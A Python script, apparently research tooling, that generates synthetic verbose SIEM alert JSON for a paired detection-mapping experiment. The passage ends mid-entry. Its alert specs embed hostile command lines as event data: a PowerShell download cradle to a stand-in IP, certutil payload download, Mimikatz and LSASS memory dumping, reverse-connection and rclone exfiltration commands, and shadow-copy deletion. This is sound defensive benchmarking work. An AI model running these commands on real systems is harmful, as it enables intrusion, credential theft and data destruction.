"""
Génère alerts_verbose.csv : versions « SIEM natives » (JSON verbeux, bruité) d'un sous-ensemble
des alertes de alerts_v2.csv, pour la remarque R2.1 (round 2) de la révision IEEE Access.

Plan expérimental APPARIÉ :
  - variant = "verbose" : même incident, même vérité terrain, exprimé comme une alerte SIEM/EDR
    exportée (enveloppe de règle, hôte, utilisateur, événements bruts Sysmon / Windows Security /
    proxy / pare-feu, enrichissements CMDB, champs techniques de bruit) ;
  - variant = "control" : copie EXACTE du texte court d'origine, rejouée dans le même run pour
    détecter une dérive du service (system_fingerprint, tokens) entre run_final et run_verbose.

Choix méthodologiques (à décrire dans le manuscrit) :
  - aucune étiquette de technique ATT&CK ni de verdict n'est incluse dans le JSON (sinon le
    mapping deviendrait trivial) ;
  - les adresses et domaines utilisent les plages réservées à la documentation (RFC 5737 :
    192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24 ; RFC 2606 : *.example.*) ;
  - le contexte qui rend une alerte bénigne figure dans les champs d'enrichissement (CMDB,
    gestion des changements), comme dans un SOC réel ;
  - les événements sont SYNTHÉTIQUES mais structurés comme des exports réels. Pour répondre
    pleinement au reviewer, AJOUTEZ quelques événements authentiques (p. ex. OTRF
    Security-Datasets / Mordor) avec source="authentic_<jeu>" : le notebook v3 les compte à part.

Usage : python make_alerts_verbose.py [chemin_alerts_v2.csv] [sortie.csv]
"""
import csv
import hashlib
import json
import random
import sys
from datetime import datetime, timedelta, timezone

SRC = sys.argv[1] if len(sys.argv) > 1 else "alerts_v2.csv"
DST = sys.argv[2] if len(sys.argv) > 2 else "alerts_verbose.csv"
RNG = random.Random(2026)
BASE_TS = datetime(2026, 10, 12, 8, 0, tzinfo=timezone.utc)

VERBOSE_IDS = ["M00", "M01", "M03", "M04", "M06", "M07", "M09", "M13", "M14", "M17", "M19", "M21",
               "M25", "M27", "M36", "M39", "M46",
               "B00", "B01", "B02", "B05", "B06", "B08", "B15", "B21"]
CONTROL_IDS = ["M02", "M10", "M24", "M44", "B03", "B11", "B13", "B20"]


# ---------------------------------------------------------------------------- helpers
def ts(minutes=0, seconds=0):
    return (BASE_TS + timedelta(minutes=minutes, seconds=seconds)).isoformat().replace("+00:00", "Z")


def guid(seed):
    h = hashlib.md5(seed.encode()).hexdigest()
    return f"{h[:8]}-{h[8:12]}-{h[12:16]}-{h[16:20]}-{h[20:32]}"


def sha256(seed):
    return hashlib.sha256(seed.encode()).hexdigest()


def internal_ip(seed):
    r = random.Random(seed)
    return f"10.{r.randint(1, 40)}.{r.randint(0, 254)}.{r.randint(2, 250)}"


def mac(seed):
    r = random.Random(seed)
    return "00-50-56-" + "-".join(f"{r.randint(0, 255):02X}" for _ in range(3))


def host(name, os_name="Windows 10 Enterprise", build="19045.4894", role="workstation", criticality="low",
         owner_dept="IT", domain="corp.example.com"):
    return {
        "name": name.lower(), "hostname": name, "domain": domain,
        "os": {"family": "windows", "name": os_name, "build": build, "kernel": "10.0." + build.split(".")[0]},
        "ip": [internal_ip(name), "fe80::" + sha256(name)[:4] + ":" + sha256(name)[4:8]],
        "mac": [mac(name)],
        "asset": {"role": role, "criticality": criticality, "owner_department": owner_dept,
                  "cmdb_id": "CI" + str(int(sha256(name)[:6], 16) % 900000 + 100000)},
    }


def user(name, dept="Finance", title="Accountant", groups=("Domain Users",), sid_seed=None):
    return {"name": name, "domain": "CORP", "id": "S-1-5-21-3623811015-3361044348-30300820-" +
            str(1100 + int(sha256(sid_seed or name)[:4], 16) % 8000),
            "department": dept, "title": title, "groups": list(groups)}


def agent(product="Elastic Agent", version="8.15.2"):
    return {"type": "endpoint", "name": product, "version": version, "id": guid(product + version),
            "ephemeral_id": guid(product + version + "eph")}


def sysmon_proc(t, hostname, user_s, image, cmd, parent, parent_cmd, integrity="Medium", pid=None, ppid=None,
                cwd="C:\\Windows\\system32\\"):
    pid = pid or RNG.randint(1200, 15000)
    ppid = ppid or RNG.randint(600, 12000)
    return {"@timestamp": t, "event": {"provider": "Microsoft-Windows-Sysmon", "code": 1,
                                        "action": "Process creation", "category": ["process"],
                                        "type": ["start"], "record_id": RNG.randint(10 ** 6, 10 ** 7)},
            "winlog": {"computer_name": hostname, "channel": "Microsoft-Windows-Sysmon/Operational",
                       "event_data": {"RuleName": "-", "UtcTime": t.replace("T", " ").rstrip("Z"),
                                      "ProcessGuid": "{" + guid(image + t) + "}", "ProcessId": str(pid),
                                      "Image": image, "FileVersion": "10.0.19041.1",
                                      "Description": image.split("\\")[-1], "Company": "Microsoft Corporation",
                                      "CommandLine": cmd, "CurrentDirectory": cwd, "User": user_s,
                                      "LogonGuid": "{" + guid(user_s + "logon") + "}",
                                      "LogonId": hex(RNG.randint(10 ** 6, 10 ** 8)),
                                      "TerminalSessionId": "1", "IntegrityLevel": integrity,
                                      "Hashes": f"SHA256={sha256(image).upper()},IMPHASH={sha256(image + 'i')[:32].upper()}",
                                      "ParentProcessGuid": "{" + guid(parent + t) + "}", "ParentProcessId": str(ppid),
                                      "ParentImage": parent, "ParentCommandLine": parent_cmd,
                                      "ParentUser": user_s}}}


def win_event(t, hostname, code, action, data, channel="Security", provider="Microsoft-Windows-Security-Auditing"):
    return {"@timestamp": t, "event": {"provider": provider, "code": code, "action": action,
                                        "record_id": RNG.randint(10 ** 6, 10 ** 8)},
            "winlog": {"computer_name": hostname, "channel": channel, "keywords": ["Audit Success"]
                       if "fail" not in action.lower() else ["Audit Failure"], "event_data": data}}


def net_conn(t, src, dst, dport, proto="tcp", bytes_out=0, bytes_in=0, app=None, sensor="zeek", extra=None):
    d = {"@timestamp": t, "event": {"dataset": f"{sensor}.connection", "category": ["network"]},
         "source": {"ip": src, "port": RNG.randint(49152, 65535), "bytes": bytes_out},
         "destination": {"ip": dst, "port": dport, "bytes": bytes_in},
         "network": {"transport": proto, "direction": "outbound" if not dst.startswith("10.") else "internal",
                     "community_id": "1:" + sha256(src + dst + str(dport))[:27] + "="},
         "zeek": {"conn_state": "SF", "history": "ShADadFf", "duration": round(RNG.uniform(0.2, 900), 3)}}
    if app:
        d["network"]["protocol"] = app
    if extra:
        d.update(extra)
    return d


def proxy(t, src, user_n, url, method="GET", status=200, bytes_out=512, bytes_in=2048, category="Uncategorized",
          ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0 Safari/537.36"):
    return {"@timestamp": t, "event": {"dataset": "proxy.access", "category": ["web"]},
            "source": {"ip": src}, "user": {"name": user_n},
            "url": {"full": url, "domain": url.split("/")[2]}, "http": {"request": {"method": method,
                                                                                     "bytes": bytes_out},
                                                                         "response": {"status_code": status,
                                                                                      "bytes": bytes_in}},
            "user_agent": {"original": ua}, "proxy": {"category": category, "action": "allowed",
                                                      "policy": "Default-Outbound"}}


def envelope(alert_id, rule_name, severity, risk, product, host_d, user_d, events, enrichment, rule_query,
             related=None, extra=None):
    d = {
        "@timestamp": ts(RNG.randint(1, 30)),
        "alert": {"uuid": guid(alert_id + rule_name), "status": "open", "workflow_status": "new",
                  "rule": {"name": rule_name, "uuid": guid(rule_name), "severity": severity,
                           "risk_score": risk, "type": "eql" if "Sysmon" in json.dumps(events) else "query",
                           "query": rule_query, "interval": "5m", "from": "now-6m",
                           "author": ["SOC Detection Engineering"], "version": RNG.randint(3, 14),
                           "references": [], "false_positives": []},
                  "original_time": ts(0), "depth": 1, "reason": f"{rule_name} on {host_d['hostname']}",
                  "source_product": product},
        "host": host_d, "user": user_d, "agent": agent(),
        "ecs": {"version": "8.11.0"},
        "data_stream": {"type": "logs", "dataset": "siem.alerts", "namespace": "default"},
        "observer": {"vendor": product.split()[0], "product": product, "hostname": "siem-ingest-0" + str(RNG.randint(1, 4))},
        "events": events,
        "enrichment": enrichment,
        "related_alerts_24h": related or [],
        "tags": ["siem", "auto-generated", "tenant:corp", "pipeline:ingest-v4"],
    }
    if extra:
        d.update(extra)
    return d


def b64ps(text):
    import base64
    return base64.b64encode(text.encode("utf-16-le")).decode()


# ---------------------------------------------------------------------------- per-alert specs
def build(aid):
    S = {}
    if aid == "M00":
        h = host("WKS-042", owner_dept="Sales")
        u = user("mbenali", "Sales", "Account Manager")
        enc = b64ps("$c=New-Object Net.WebClient;$c.Headers.Add('User-Agent','Mozilla/5.0');"
                    "IEX $c.DownloadString('http://198.51.100.23/s/a.ps1')")
        ev = [sysmon_proc(ts(0), "WKS-042", "CORP\\mbenali",
                          "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                          f"powershell.exe -NoP -NonI -W Hidden -EncodedCommand {enc}",
                          "C:\\Windows\\explorer.exe", "C:\\Windows\\Explorer.EXE"),
              win_event(ts(0, 2), "WKS-042", 4104, "Execute a Remote Command",
                        {"MessageNumber": "1", "MessageTotal": "1", "ScriptBlockId": guid("sb42"),
                         "ScriptBlockText": "$c=New-Object Net.WebClient;$c.Headers.Add('User-Agent','Mozilla/5.0');"
                                            "IEX $c.DownloadString('http://198.51.100.23/s/a.ps1')", "Path": ""},
                        channel="Microsoft-Windows-PowerShell/Operational", provider="Microsoft-Windows-PowerShell"),
              net_conn(ts(0, 3), h["ip"][0], "198.51.100.23", 80, app="http", bytes_out=412, bytes_in=18344)]
        S = envelope(aid, "PowerShell EncodedCommand Execution", "high", 73, "Elastic Security", h, u, ev,
                     {"user_risk": "low", "host_last_patch": "2026-10-08", "threat_intel": {"198.51.100.23": "no match"},
                      "change_management": {"open_changes_for_host": []}},
                     'process.name:"powershell.exe" and process.args:("-EncodedCommand" or "-enc")')
    elif aid == "M01":
        h = host("SRV-APP-07", "Windows Server 2019 Datacenter", "17763.6293", "application server", "high", "IT")
        u = user("admin_svc", "IT", "Service account", ("Domain Users", "APP-Admins"))
        ev = [win_event(ts(0, s * 4), "SRV-APP-07", 4625, "logon-failed",
                        {"TargetUserName": "admin_svc", "TargetDomainName": "CORP", "Status": "0xc000006d",
                         "SubStatus": "0xc000006a", "LogonType": "10", "IpAddress": "203.0.113.45",
                         "IpPort": str(RNG.randint(40000, 60000)), "WorkstationName": "-",
                         "AuthenticationPackageName": "NTLM", "LogonProcessName": "NtLmSsp"}) for s in range(6)]
        ev.append({"aggregated_similar_events": {"code": 4625, "count": 23, "first": ts(0), "last": ts(1, 32)}})
        ev.append(win_event(ts(1, 40), "SRV-APP-07", 4624, "logged-in",
                            {"TargetUserName": "admin_svc", "TargetDomainName": "CORP", "LogonType": "10",
                             "IpAddress": "203.0.113.45", "LogonId": "0x3e7a91f",
                             "AuthenticationPackageName": "Negotiate", "ElevatedToken": "%%1842",
                             "LogonProcessName": "User32"}))
        S = envelope(aid, "Brute Force Followed by Successful Logon", "high", 81, "Microsoft Sentinel", h, u, ev,
                     {"geoip": {"203.0.113.45": {"country": "NL", "asn": "AS64500 Example Hosting"}},
                      "account_profile": {"usual_source_ips": ["10.4.12.0/24"], "interactive_logon_expected": False},
                      "change_management": {"open_changes_for_host": []}},
                     "SecurityEvent | where EventID in (4625,4624) | summarize by TargetUserName, IpAddress")
    elif aid == "M03":
        h = host("DC-01", "Windows Server 2022 Datacenter", "20348.2762", "domain controller", "critical", "IT")
        u = user("jlopez", "Marketing", "Marketing Specialist")
        task_xml = ("<Task><Triggers><LogonTrigger><Enabled>true</Enabled></LogonTrigger></Triggers>"
                    "<Principals><Principal id=\"Author\"><UserId>S-1-5-18</UserId><RunLevel>HighestAvailable"
                    "</RunLevel></Principal></Principals><Actions><Exec><Command>C:\\Users\\Public\\"
                    "update.exe</Command><Arguments>-silent</Arguments></Exec></Actions></Task>")
        ev = [win_event(ts(0), "DC-01", 4698, "scheduled-task-created",
                        {"SubjectUserName": "jlopez", "SubjectDomainName": "CORP", "SubjectLogonId": "0x1a2b3c4",
                         "TaskName": "\\Microsoft\\Windows\\UpdateOrchestrator\\UpdateCheck", "TaskContent": task_xml}),
              win_event(ts(0, -40), "DC-01", 4624, "logged-in",
                        {"TargetUserName": "jlopez", "LogonType": "3", "IpAddress": internal_ip("WKS-311")})]
        S = envelope(aid, "Scheduled Task Created on Domain Controller", "medium", 63, "Microsoft Sentinel", h, u, ev,
                     {"user_privileged": False, "file_reputation": {"C:\\Users\\Public\\update.exe": "unknown, first seen 2026-10-12"},
                      "change_management": {"open_changes_for_host": []}},
                     "SecurityEvent | where EventID == 4698 and Computer startswith 'DC-'")
    elif aid == "M04":
        h = host("WKS-107", owner_dept="Engineering")
        u = user("rchen", "Engineering", "Software Engineer", ("Domain Users", "Local Admins WKS-107"))
        ev = [{"@timestamp": ts(0), "event": {"provider": "Microsoft-Windows-Windows Defender", "code": 1116,
                                               "action": "malware-detected"},
               "defender": {"ThreatName": "HackTool:Win32/Mimikatz.D", "SeverityName": "High", "CategoryName": "Tool",
                            "Path": "process:_pid:7712,ProcessStart:133731264000000000; file:_C:\\ProgramData\\Temp\\svchost64.exe",
                            "DetectionSource": "AMSI / Behavior Monitoring", "ActionName": "Not Applicable",
                            "EngineVersion": "1.1.24090.11", "ProductVersion": "4.18.24090.11"}},
              sysmon_proc(ts(0, -5), "WKS-107", "CORP\\rchen", "C:\\ProgramData\\Temp\\svchost64.exe",
                          "svchost64.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit",
                          "C:\\Windows\\System32\\cmd.exe", "cmd.exe /c C:\\ProgramData\\Temp\\svchost64.exe", "High"),
              {"@timestamp": ts(0, -4), "event": {"provider": "Microsoft-Windows-Sysmon", "code": 10,
                                                   "action": "Process accessed"},
               "winlog": {"event_data": {"SourceImage": "C:\\ProgramData\\Temp\\svchost64.exe",
                                         "TargetImage": "C:\\Windows\\system32\\lsass.exe", "GrantedAccess": "0x1010",
                                         "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+9d4c4|C:\\Windows\\System32\\KERNELBASE.dll+2c13e|UNKNOWN(00007FF6A1B2C3D4)"}}}]
        S = envelope(aid, "Credential Theft Tool Signature in Memory", "critical", 95, "Microsoft Defender for Endpoint",
                     h, u, ev, {"file_signature": {"svchost64.exe": "unsigned"}, "prevalence_in_org": 1,
                                "change_management": {"open_changes_for_host": []}},
                     "DeviceEvents | where ActionType == 'AntivirusDetection'")
    elif aid == "M06":
        h = host("WKS-219", owner_dept="Finance")
        u = user("pmartin", "Finance", "Financial Analyst")
        dll = "C:\\Users\\pmartin\\AppData\\Local\\Temp\\wtmp8812.dll"
        ev = [sysmon_proc(ts(0), "WKS-219", "CORP\\pmartin", "C:\\Windows\\System32\\rundll32.exe",
                          f"rundll32.exe {dll},DllRegisterServer",
                          "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
                          "\"EXCEL.EXE\" \"C:\\Users\\pmartin\\Downloads\\Q3_budget_review.xlsm\""),
              {"@timestamp": ts(0, 6), "event": {"provider": "Microsoft-Windows-Sysmon", "code": 8,
                                                  "action": "CreateRemoteThread detected"},
               "winlog": {"event_data": {"SourceImage": "C:\\Windows\\System32\\rundll32.exe",
                                         "TargetImage": "C:\\Windows\\explorer.exe", "StartAddress": "0x000001C4A2B30000",
                                         "StartModule": "-", "StartFunction": "-", "NewThreadId": "9124"}}},
              {"@timestamp": ts(0, 1), "event": {"provider": "Microsoft-Windows-Sysmon", "code": 11,
                                                  "action": "File created"},
               "winlog": {"event_data": {"Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
                                         "TargetFilename": dll}}}]
        S = envelope(aid, "Rundll32 Spawned by Office Application with Remote Thread", "high", 84, "Elastic Security",
                     h, u, ev, {"file_reputation": {dll: "unknown"}, "parent_child_rarity": "rare (0 occurrences 30d)",
                                "change_management": {"open_changes_for_host": []}},
                     'sequence by host.id [process where process.name=="rundll32.exe" and process.parent.name=="EXCEL.EXE"] [api where event.code=="8"]')
    elif aid == "M07":
        h = host("WKS-233", owner_dept="Finance")
        u = user("tmartin", "Finance", "Payroll Officer")
        ev = []
        for i, srv in enumerate(["SRV-APP-01", "SRV-APP-02", "SRV-DB-03", "SRV-FS-01"]):
            ev.append(win_event(ts(i), srv, 4624, "logged-in", {"TargetUserName": "tmartin", "LogonType": "3",
                                                                 "IpAddress": h["ip"][0], "AuthenticationPackageName": "NTLM"}))
            ev.append(win_event(ts(i, 3), srv, 7045, "service-installed",
                                {"ServiceName": "PSEXESVC", "ImagePath": "%SystemRoot%\\PSEXESVC.exe",
                                 "ServiceType": "user mode service", "StartType": "demand start",
                                 "AccountName": "LocalSystem"}, channel="System",
                                provider="Service Control Manager"))
        ev.insert(0, sysmon_proc(ts(0, -10), "WKS-233", "CORP\\tmartin", "C:\\Users\\tmartin\\Downloads\\PsExec64.exe",
                                 "PsExec64.exe -accepteula \\\\SRV-APP-01,SRV-APP-02,SRV-DB-03,SRV-FS-01 -s cmd /c \"ipconfig /all & whoami /groups\"",
                                 "C:\\Windows\\System32\\cmd.exe", "cmd.exe"))
        S = envelope(aid, "PsExec Remote Service Installation on Multiple Servers", "high", 79, "Microsoft Sentinel",
                     h, u, ev, {"user_is_admin": False, "peer_group_usage_of_psexec": "never",
                                "change_management": {"open_changes_for_host": []}},
                     "Event | where EventID == 7045 and ServiceName == 'PSEXESVC' | summarize dcount(Computer) by bin(TimeGenerated,10m)")
    elif aid == "M09":
        h = host("WKS-061", owner_dept="Legal")
        u = user("kdubois", "Legal", "Paralegal")
        ev = [net_conn(ts(i * 2), h["ip"][0], "203.0.113.77", 445, app="smb", bytes_out=RNG.randint(8, 20) * 10 ** 6,
                       bytes_in=RNG.randint(20, 90) * 10 ** 3) for i in range(4)]
        ev.append({"@timestamp": ts(0), "event": {"dataset": "firewall.traffic"}, "firewall": {
            "rule": "ALLOW-ANY-OUT-LEGACY", "action": "allow", "zone_from": "USERS", "zone_to": "WAN", "nat_ip": "192.0.2.10"}})
        S = envelope(aid, "Outbound SMB to Internet", "medium", 66, "Splunk Enterprise Security", h, u, ev,
                     {"geoip": {"203.0.113.77": {"country": "SC", "asn": "AS64511 Offshore VPS Ltd"}},
                      "bytes_out_total": 54210331, "change_management": {"open_changes_for_host": []}},
                     "| tstats sum(bytes_out) from datamodel=Network_Traffic where dest_port=445 dest_category!=internal by src dest")
    elif aid == "M13":
        h = host("WKS-150", owner_dept="HR")
        u = user("lnguyen", "HR", "HR Generalist")
        ev = [sysmon_proc(ts(0), "WKS-150", "CORP\\lnguyen", "C:\\Windows\\System32\\certutil.exe",
                          "certutil.exe -urlcache -split -f http://198.51.100.14/img/logo.png C:\\Users\\Public\\l.dat",
                          "C:\\Windows\\System32\\cmd.exe", "cmd.exe /c \"C:\\Users\\lnguyen\\AppData\\Local\\Temp\\run.bat\""),
              {"@timestamp": ts(0, 2), "event": {"provider": "Microsoft-Windows-Sysmon", "code": 11, "action": "File created"},
               "winlog": {"event_data": {"Image": "C:\\Windows\\System32\\certutil.exe", "TargetFilename": "C:\\Users\\Public\\l.dat"}}},
              sysmon_proc(ts(0, 9), "WKS-150", "CORP\\lnguyen", "C:\\Windows\\System32\\certutil.exe",
                          "certutil.exe -decode C:\\Users\\Public\\l.dat C:\\Users\\Public\\l.exe",
                          "C:\\Windows\\System32\\cmd.exe", "cmd.exe /c \"C:\\Users\\lnguyen\\AppData\\Local\\Temp\\run.bat\""),
              proxy(ts(0, 1), h["ip"][0], "lnguyen", "http://198.51.100.14/img/logo.png", bytes_in=388112,
                    ua="CertUtil URL Agent", category="Newly Observed Domain")]
        S = envelope(aid, "Certutil Used to Download Remote File", "high", 77, "Elastic Security", h, u, ev,
                     {"threat_intel": {"198.51.100.14": "no match"}, "change_management": {"open_changes_for_host": []}},
                     'process.name:"certutil.exe" and process.args:("-urlcache" or "-decode")')
    elif aid == "M14":
        h = host("FS-01", "Windows Server 2019 Standard", "17763.6293", "file server", "high", "IT")
        u = user("svc_print", "IT", "Service account", ("Domain Users", "Print Operators"))
        ev = [{"@timestamp": ts(i), "event": {"provider": "Microsoft-Windows-Windows Defender", "code": 1117,
                                               "action": "malware-action-taken"},
               "defender": {"ThreatName": "Ransom:Win32/LockBit.SA!MTB", "SeverityName": "Severe",
                            "Path": f"file:_D:\\Shares\\Finance\\2026\\{n}", "ActionName": "Quarantine",
                            "ProcessName": "C:\\Windows\\System32\\svchost.exe", "DetectionUser": "CORP\\svc_print"}}
              for i, n in enumerate(["~tmp4410.exe", "invoice_scan_10.exe", "~tmp4417.exe"])]
        ev.append(win_event(ts(0, -30), "FS-01", 5145, "network-share-object-checked",
                            {"ShareName": "\\\\*\\Finance", "RelativeTargetName": "2026\\~tmp4410.exe",
                             "IpAddress": internal_ip("WKS-188"), "SubjectUserName": "svc_print", "AccessMask": "0x2"}))
        S = envelope(aid, "Ransomware Signature Quarantined on File Server", "critical", 96,
                     "Microsoft Defender for Endpoint", h, u, ev,
                     {"source_host_of_write": "WKS-188", "change_management": {"open_changes_for_host": []}},
                     "DeviceEvents | where ActionType has 'Antivirus' and ThreatName startswith 'Ransom:'")
    elif aid == "M17":
        h = host("WKS-073", owner_dept="Procurement")
        u = user("ahassan", "Procurement", "Buyer", ("Domain Users", "Local Admins WKS-073"))
        ev = [sysmon_proc(ts(0), "WKS-073", "CORP\\ahassan", "C:\\Windows\\System32\\rundll32.exe",
                          "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 712 C:\\Windows\\Temp\\d.bin full",
                          "C:\\Windows\\System32\\cmd.exe", "cmd.exe /q /c tasklist /fi \"imagename eq lsass.exe\" & rundll32.exe ...",
                          "High"),
              {"@timestamp": ts(0, 1), "event": {"provider": "Microsoft-Windows-Sysmon", "code": 10, "action": "Process accessed"},
               "winlog": {"event_data": {"SourceImage": "C:\\Windows\\System32\\rundll32.exe",
                                         "TargetImage": "C:\\Windows\\system32\\lsass.exe", "GrantedAccess": "0x1FFFFF",
                                         "SourceProcessId": "5520", "TargetProcessId": "712"}}},
              {"@timestamp": ts(0, 3), "event": {"provider": "Microsoft-Windows-Sysmon", "code": 11, "action": "File created"},
               "winlog": {"event_data": {"Image": "C:\\Windows\\System32\\rundll32.exe", "TargetFilename": "C:\\Windows\\Temp\\d.bin"}}}]
        S = envelope(aid, "LSASS Memory Access by Non-System Process", "critical", 92, "Elastic Security", h, u, ev,
                     {"file_size_bytes": {"C:\\Windows\\Temp\\d.bin": 52428800}, "change_management": {"open_changes_for_host": []}},
                     'process where event.code=="10" and winlog.event_data.TargetImage:"*lsass.exe"')
    elif aid == "M19":
        h = host("WKS-305", owner_dept="Accounts Payable")
        u = user("ebernard", "Finance", "AP Clerk")
        ev = [{"@timestamp": ts(-6), "event": {"dataset": "email.gateway", "action": "delivered"},
               "email": {"from": {"address": "billing@supplier-example.net"}, "to": {"address": "ebernard@corp.example.com"},
                         "subject": "RE: Overdue invoice 2026-1093", "attachments": [{"file": {"name": "Invoice_2026-1093.docm",
                                                                                             "hash": {"sha256": sha256("docm")}}}],
                         "headers": {"spf": "pass", "dkim": "none", "dmarc": "none", "return_path": "bounce@mail-relay.example.org"},
                         "sender_first_seen": "2026-10-12"}},
              sysmon_proc(ts(0), "WKS-305", "CORP\\ebernard", "C:\\Windows\\System32\\cmd.exe",
                          "cmd.exe /c powershell -w hidden -c \"iwr http://203.0.113.9/x.bin -OutFile $env:TEMP\\x.exe; & $env:TEMP\\x.exe\"",
                          "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
                          "\"WINWORD.EXE\" /n \"C:\\Users\\ebernard\\Downloads\\Invoice_2026-1093.docm\" /o \"\"")]
        S = envelope(aid, "Office Macro Spawned Command Shell", "high", 86, "Microsoft Defender for Endpoint", h, u, ev,
                     {"sender_domain_age_days": 3, "change_management": {"open_changes_for_host": []}},
                     "DeviceProcessEvents | where InitiatingProcessFileName =~ 'winword.exe' and FileName in~ ('cmd.exe','powershell.exe')")
    elif aid == "M21":
        h = host("DC-02", "Windows Server 2022 Datacenter", "20348.2762", "domain controller", "critical", "IT")
        u = user("intern07", "IT", "IT Intern")
        ev = [win_event(ts(0, i * 7), "DC-02", 4771, "kerberos-preauth-failed",
                        {"TargetUserName": n, "ServiceName": "krbtgt/CORP", "Status": "0x18",
                         "IpAddress": "::ffff:" + internal_ip("WKS-402"), "PreAuthType": "2"})
              for i, n in enumerate(["svc_sql", "svc_backup", "svc_web", "svc_crm", "svc_sql", "svc_sap"])]
        ev += [win_event(ts(1, i * 3), "DC-02", 4769, "kerberos-service-ticket-requested",
                         {"TargetUserName": "intern07@CORP.EXAMPLE.COM", "ServiceName": spn, "TicketEncryptionType": "0x17",
                          "TicketOptions": "0x40810000", "IpAddress": "::ffff:" + internal_ip("WKS-402"), "Status": "0x0"})
               for i, spn in enumerate(["svc_sql", "svc_web", "svc_crm", "svc_sap", "svc_reporting", "svc_iis"])]
        ev.append({"aggregated_similar_events": {"code": 4771, "count": 41, "first": ts(0), "last": ts(4)}})
        S = envelope(aid, "Excessive Kerberos Pre-Authentication Failures and RC4 Service Tickets", "high", 78,
                     "Microsoft Sentinel", h, u, ev, {"source_host": "WKS-402", "user_tenure_days": 23,
                                                      "change_management": {"open_changes_for_host": []}},
                     "SecurityEvent | where EventID in (4771,4769) | summarize count() by IpAddress, bin(TimeGenerated,5m)")
    elif aid == "M25":
        h = host("WKS-128", owner_dept="R&D")
        u = user("ofarouk", "R&D", "Research Engineer")
        ev = [sysmon_proc(ts(0), "WKS-128", "CORP\\ofarouk", "C:\\Users\\ofarouk\\AppData\\Local\\Temp\\rc\\rclone.exe",
                          "rclone.exe copy \\\\FS-02\\RnD\\Projects remote:bkp --transfers 16 --no-check-certificate -q",
                          "C:\\Windows\\System32\\cmd.exe", "cmd.exe")]
        ev += [proxy(ts(i * 3), h["ip"][0], "ofarouk", f"https://upload-{i}.filestore.example.com/api/v2/upload",
                     method="POST", bytes_out=RNG.randint(600, 900) * 10 ** 6, bytes_in=2210, category="File Storage/Sharing",
                     ua="rclone/v1.68.1") for i in range(5)]
        S = envelope(aid, "Large Outbound Upload to Cloud Storage", "high", 74, "Splunk Enterprise Security", h, u, ev,
                     {"sanctioned_cloud_apps": ["contoso-my.sharepoint.example.com"], "bytes_out_1h": 3.71e9,
                      "user_status": "resignation notice received 2026-10-01", "change_management": {"open_changes_for_host": []}},
                     "| tstats sum(bytes_out) from datamodel=Web where category=\"File Storage*\" by user dest | where sum > 1e9")
    elif aid == "M27":
        h = host("WKS-091", owner_dept="Sales")
        u = user("sgarcia", "Sales", "Sales Assistant")
        ev = [sysmon_proc(ts(0), "WKS-091", "CORP\\sgarcia",
                          "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                          "powershell.exe -nop -w hidden -c \"$s=[System.Net.Sockets.TCPClient]::new('203.0.113.31',8443)\"",
                          "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
                          "\"WINWORD.EXE\" \"C:\\Users\\sgarcia\\Downloads\\Order_confirmation.doc\""),
              net_conn(ts(0, 2), h["ip"][0], "203.0.113.31", 8443, bytes_out=3412, bytes_in=118220)]
        S = envelope(aid, "Suspicious Child Process of Microsoft Word", "high", 83, "Elastic Security", h, u, ev,
                     {"change_management": {"open_changes_for_host": []}},
                     'process.parent.name:"WINWORD.EXE" and process.name:("powershell.exe" or "cmd.exe" or "wscript.exe")')
    elif aid == "M36":
        h = host("WKS-277", owner_dept="Logistics")
        u = user("ykarim", "Logistics", "Logistics Coordinator")
        q = []
        for i in range(10):
            sub = sha256(f"tun{i}")[:RNG.randint(40, 58)]
            q.append({"@timestamp": ts(0, i * 3), "event": {"dataset": "zeek.dns"},
                      "source": {"ip": h["ip"][0]}, "dns": {"question": {"name": f"{sub}.t.sync.example.net", "type": "TXT"},
                                                            "response_code": "NOERROR", "answers_count": 1,
                                                            "answers": [{"type": "TXT", "data": sha256(sub)[:48]}]}})
        q.append({"aggregated_similar_events": {"dataset": "zeek.dns", "count": 2814, "distinct_subdomains": 2790,
                                                "window": "60m", "avg_qname_length": 71}})
        S = envelope(aid, "Possible DNS Tunneling (High-Entropy TXT Queries)", "medium", 68, "Splunk Enterprise Security",
                     h, u, q, {"domain_whois": {"sync.example.net": "registered 2026-10-09, privacy-protected"},
                               "change_management": {"open_changes_for_host": []}},
                     "| tstats count dc(query) from datamodel=Network_Resolution where record_type=TXT by src, domain")
    elif aid == "M39":
        h = host("SRV-ERP-02", "Windows Server 2019 Standard", "17763.6293", "ERP server", "critical", "Finance")
        u = user("adm_ext04", "IT", "External contractor", ("Domain Users", "ERP-Admins"))
        par = "C:\\ProgramData\\Microsoft\\Crypto\\RSA\\sysupd.exe"
        ev = [sysmon_proc(ts(0, i * 2), "SRV-ERP-02", "CORP\\adm_ext04", img, cmd, par, par, "High")
              for i, (img, cmd) in enumerate([
                  ("C:\\Windows\\System32\\vssadmin.exe", "vssadmin.exe delete shadows /all /quiet"),
                  ("C:\\Windows\\System32\\wbem\\WMIC.exe", "wmic.exe shadowcopy delete"),
                  ("C:\\Windows\\System32\\bcdedit.exe", "bcdedit.exe /set {default} recoveryenabled No"),
                  ("C:\\Windows\\System32\\wbadmin.exe", "wbadmin.exe delete catalog -quiet")])]
        S = envelope(aid, "Shadow Copy Deletion via Vssadmin", "critical", 94, "Elastic Security", h, u, ev,
                     {"parent_signature": "unsigned", "backup_software_installed": "none on host",
                      "change_management": {"open_changes_for_host": []}},
                     'process.name:("vssadmin.exe" or "wmic.exe") and process.args:("delete" and "shadow*")')
    elif aid == "M46":
        h = host("WEB-DMZ-01", "Windows Server 2019 Standard", "17763.6293", "public web server", "high", "Marketing")
        u = user("IIS APPPOOL\\DefaultAppPool", "N/A", "Application pool identity")
        iis = [{"@timestamp": ts(0, i * 20), "event": {"dataset": "iis.access"},
                "source": {"ip": "198.51.100.88"}, "url": {"path": "/aspnet_client/system_web/errorEE.aspx",
                                                           "query": q}, "http": {"request": {"method": "POST"},
